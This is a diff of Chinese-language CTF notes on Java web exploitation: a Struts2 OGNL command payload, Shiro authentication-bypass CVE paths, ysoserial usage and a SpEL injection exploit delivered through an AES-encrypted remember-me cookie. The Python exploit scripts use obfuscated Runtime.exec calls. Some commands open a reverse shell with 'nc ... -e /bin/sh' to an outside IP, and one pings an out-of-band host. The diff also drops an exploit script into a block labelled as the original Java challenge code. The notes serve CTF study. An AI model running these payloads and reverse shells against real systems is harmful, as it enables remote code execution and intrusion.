@@ -3341,7 +3341,7 @@ Struts2 使用一种叫做 "Action-Based" 的模式来处理 HTTP 请求。每�
 
 所以，`index.action` 是 Struts2 中的一个 action，它是处理用户请求的业务逻辑的地方。具体的业务逻辑会根据你的应用的需求来编写。
 
-模版漏洞
+**模板漏洞**
 
 ```
 %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"env"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
@@ -3435,28 +3435,51 @@ $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --e
 `/ssti` 是 Web 路径，`template` 是 GET 参数，根据具体的题目不同更改。如，原题目的代码是
 
 ```java
-package BOOT-INF.classes.com.drunkbaby.ssti2.controller;
+      
+# coding: utf-8
+import requests
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from Crypto.Util.Padding import pad, unpad
+import base64
 
-import java.io.StringWriter;
-import org.apache.velocity.VelocityContext;
-import org.apache.velocity.app.Velocity;
-import org.apache.velocity.context.Context;
-import org.springframework.web.bind.annotation.GetMapping;
-import org.springframework.web.bind.annotation.RestController;
 
-@RestController
-public class VelocitySSTI {
-  @GetMapping({"/ssti"})
-  public void velocity(String template) {
-    Velocity.init();
-    VelocityContext context = new VelocityContext();
-    context.put("author", "Elliot A.");
-    context.put("address", "217 E Broadway");
-    context.put("phone", "555-1337");
-    StringWriter swOut = new StringWriter();
-    Velocity.evaluate((Context)context, swOut, "test", template);
-  }
-}
+def encrypt(key, init_vector, value):
+    key_bytes = key.encode('utf-8')
+    iv_bytes = init_vector.encode('utf-8')
+    cipher = Cipher(
+        algorithms.AES(key_bytes),
+        modes.CBC(iv_bytes),
+        backend=default_backend()
+    )
+    encryptor = cipher.encryptor()
+    padded_data = pad(value.encode('utf-8'), 16, style='pkcs7')
+    encrypted = encryptor.update(padded_data) + encryptor.finalize()
+    return base64.urlsafe_b64encode(encrypted).decode('utf-8')
+
+
+def exp(payload):
+    s = requests.Session()
+
+    url = "http://www.247533.com:10012"
+    login_url = f"{url}/login"
+
+    s.post(login_url, data={"username": "admin", "password": "admin"})
+    exp_url = f"{url}/"
+    headers = {
+        "Cookie": f"remember-me={payload}"
+    }
+
+    print(s.get(exp_url, headers=headers).text)
+
+
+if __name__ == '__main__':
+    command = "nc 144.34.181.239 10008 -e /bin/sh"
+    payload = "#{T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String)).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(null),\"" + command + "\")}"
+    key = "c0dehack1nghere1"
+    iv = "0123456789abcdef"
+    en_payload = encrypt(key, iv, payload)
+    exp(en_payload)
 ```
 
 答案：
@@ -3516,7 +3539,7 @@ public class FreeMarkerSSTI {
 - 推荐使用 shell 反弹，因为靶机中未必有 wget 或 curl，不一定能数据外带
 - 打的时候记得 urlencode
 
-打反序列化工具
+打反序列化工具，M1 路径 `/Users/Cyberbolt/Library/CloudStorage/OneDrive-个人/编程/CTF/工具/Web/Java渗透/ysoserial`
 
 该文件的参数（如 `CommonsCollections2`），在不知道漏洞的情况下，需要自己一个一个试
 
@@ -3538,11 +3561,27 @@ java -jar ysoserial.jar CommonsCollections2 "nc 144.34.181.239 10008 -e /bin/sh 
 
 #### 其他漏洞
 
-##### vulhub/shiro:1.5.1
+##### CVE
+
+###### vulhub/shiro:1.5.1
 
 直接请求管理页面`/admin/`，无法访问，将会被重定向到登录页面
 
 构造恶意请求`/xxx/..;/admin/`，即可绕过权限校验，访问到管理页面
+
+###### 其它CVE
+
+**CVE-2016-6802** 在访问路径前加上/任意目录名/../，即可绕过访问
+
+**CVE-2020-11989** admin/page%252fABCDEFG其中admin/page为鉴权路径，ABCDEFG为随意字符串 /hello/a%25%32%66a /;/test/hello/aaa
+
+**CVE-2020-13933** admin/%3BABCDEFG，其中admin为鉴权路径，ABCDEFG为随意字符串
+
+**CVE-2020-17510** admin/%2e
+
+**CVE-2020-17523** admin/%20，其中admin为鉴权路径
+
+**CVE-2022-32532** 特定条件下的漏洞利用：当shiro使用了RegExPatternMatcher进行路由匹配时，由于Java的正则Pattern.matches解析.默认是不匹配r或者n的，因此当path中带有%0a时可绕过正则匹配 /permit/a%0any
 
 ##### tomcat 配置错误
 
@@ -3584,6 +3623,206 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 
 ```
 ?pwd=cmd&i=cat /flag
+```
+
+##### Cookie 注入(通过 AES 加密; spel 构造注入)
+
+原题目
+
+MainController.java
+
+```java
+package BOOT-INF.classes.io.tricking.challenge;
+
+import io.tricking.challenge.KeyworkProperties;
+import io.tricking.challenge.UserConfig;
+import io.tricking.challenge.spel.SmallEvaluationContext;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+import javax.servlet.http.Cookie;
+import javax.servlet.http.HttpServletResponse;
+import javax.servlet.http.HttpSession;
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.expression.EvaluationContext;
+import org.springframework.expression.Expression;
+import org.springframework.expression.ExpressionParser;
+import org.springframework.expression.ParserContext;
+import org.springframework.expression.common.TemplateParserContext;
+import org.springframework.expression.spel.standard.SpelExpressionParser;
+import org.springframework.http.HttpStatus;
+import org.springframework.stereotype.Controller;
+import org.springframework.ui.Model;
+import org.springframework.web.bind.annotation.CookieValue;
+import org.springframework.web.bind.annotation.ExceptionHandler;
+import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.PostMapping;
+import org.springframework.web.bind.annotation.RequestParam;
+import org.springframework.web.bind.annotation.ResponseStatus;
+import org.springframework.web.client.HttpClientErrorException;
+
+@Controller
+public class MainController {
+  ExpressionParser parser = (ExpressionParser)new SpelExpressionParser();
+  
+  @Autowired
+  private KeyworkProperties keyworkProperties;
+  
+  @Autowired
+  private UserConfig userConfig;
+  
+  @GetMapping
+  public String admin(@CookieValue(value = "remember-me", required = false) String rememberMeValue, HttpSession session, Model model) {
+    if (rememberMeValue != null && !rememberMeValue.equals("")) {
+      String str = this.userConfig.decryptRememberMe(rememberMeValue);
+      if (str != null)
+        session.setAttribute("username", str); 
+    } 
+    Object username = session.getAttribute("username");
+    if (username == null || username.toString().equals(""))
+      return "redirect:/login"; 
+    model.addAttribute("name", getAdvanceValue(username.toString()));
+    return "hello";
+  }
+  
+  @GetMapping({"/login"})
+  public String login() {
+    return "login";
+  }
+  
+  @GetMapping({"/login-error"})
+  public String loginError(Model model) {
+    model.addAttribute("loginError", Boolean.valueOf(true));
+    model.addAttribute("errorMsg", "登陆失败，用户名或者密码错误！");
+    return "login";
+  }
+  
+  @PostMapping({"/login"})
+  public String login(@RequestParam(value = "username", required = true) String username, @RequestParam(value = "password", required = true) String password, @RequestParam(value = "remember-me", required = false) String isRemember, HttpSession session, HttpServletResponse response) {
+    if (this.userConfig.getUsername().contentEquals(username) && this.userConfig.getPassword().contentEquals(password)) {
+      session.setAttribute("username", username);
+      if (isRemember != null && !isRemember.equals("")) {
+        Cookie c = new Cookie("remember-me", this.userConfig.encryptRememberMe());
+        c.setMaxAge(2592000);
+        response.addCookie(c);
+      } 
+      return "redirect:/";
+    } 
+    return "redirect:/login-error";
+  }
+  
+  @ExceptionHandler({HttpClientErrorException.class})
+  @ResponseStatus(HttpStatus.FORBIDDEN)
+  public String handleForbiddenException() {
+    return "forbidden";
+  }
+  
+  private String getAdvanceValue(String val) {
+    for (String keyword : this.keyworkProperties.getBlacklist()) {
+      Matcher matcher = Pattern.compile(keyword, 34).matcher(val);
+      if (matcher.find())
+        throw new HttpClientErrorException(HttpStatus.FORBIDDEN); 
+    } 
+    TemplateParserContext templateParserContext = new TemplateParserContext();
+    Expression exp = this.parser.parseExpression(val, (ParserContext)templateParserContext);
+    SmallEvaluationContext evaluationContext = new SmallEvaluationContext();
+    return exp.getValue((EvaluationContext)evaluationContext).toString();
+  }
+}
+```
+
+Encryptor.java
+
+```java
+package BOOT-INF.classes.io.tricking.challenge;
+
+import java.util.Base64;
+import javax.crypto.Cipher;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
+
+public class Encryptor {
+  static Logger logger = LoggerFactory.getLogger(io.tricking.challenge.Encryptor.class);
+  
+  public static String encrypt(String key, String initVector, String value) {
+    try {
+      IvParameterSpec iv = new IvParameterSpec(initVector.getBytes("UTF-8"));
+      SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes("UTF-8"), "AES");
+      Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5PADDING");
+      cipher.init(1, skeySpec, iv);
+      byte[] encrypted = cipher.doFinal(value.getBytes());
+      return Base64.getUrlEncoder().encodeToString(encrypted);
+    } catch (Exception ex) {
+      logger.warn(ex.getMessage());
+      return null;
+    } 
+  }
+  
+  public static String decrypt(String key, String initVector, String encrypted) {
+    try {
+      IvParameterSpec iv = new IvParameterSpec(initVector.getBytes("UTF-8"));
+      SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes("UTF-8"), "AES");
+      Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5PADDING");
+      cipher.init(2, skeySpec, iv);
+      byte[] original = cipher.doFinal(Base64.getUrlDecoder().decode(encrypted));
+      return new String(original);
+    } catch (Exception ex) {
+      logger.warn(ex.getMessage());
+      return null;
+    } 
+  }
+}
+```
+
+答案:
+
+```python
+      
+# coding: utf-8
+import requests
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from Crypto.Util.Padding import pad, unpad
+import base64
+
+
+def encrypt(key, init_vector, value):
+    key_bytes = key.encode('utf-8')
+    iv_bytes = init_vector.encode('utf-8')
+    cipher = Cipher(
+        algorithms.AES(key_bytes),
+        modes.CBC(iv_bytes),
+        backend=default_backend()
+    )
+    encryptor = cipher.encryptor()
+    padded_data = pad(value.encode('utf-8'), 16, style='pkcs7')
+    encrypted = encryptor.update(padded_data) + encryptor.finalize()
+    return base64.urlsafe_b64encode(encrypted).decode('utf-8')
+
+
+def exp(payload):
+    s = requests.Session()
+
+    url = "http://127.0.0.1:8080"
+    login_url = f"{url}/login"
+
+    s.post(login_url, data={"username": "admin", "password": "admin"})
+    exp_url = f"{url}/"
+    headers = {
+        "Cookie": f"remember-me={payload}"
+    }
+
+    print(s.get(exp_url, headers=headers).text)
+
+
+if __name__ == '__main__':
+    command = "ping i4v84j91.requestrepo.com"
+    payload = "#{T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String)).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(null),\"" + command + "\")}"
+    key = "c0dehack1nghere1"
+    iv = "0123456789abcdef"
+    en_payload = encrypt(key, iv, payload)
+    exp(en_payload)
 ```
 
 #### Java 理论
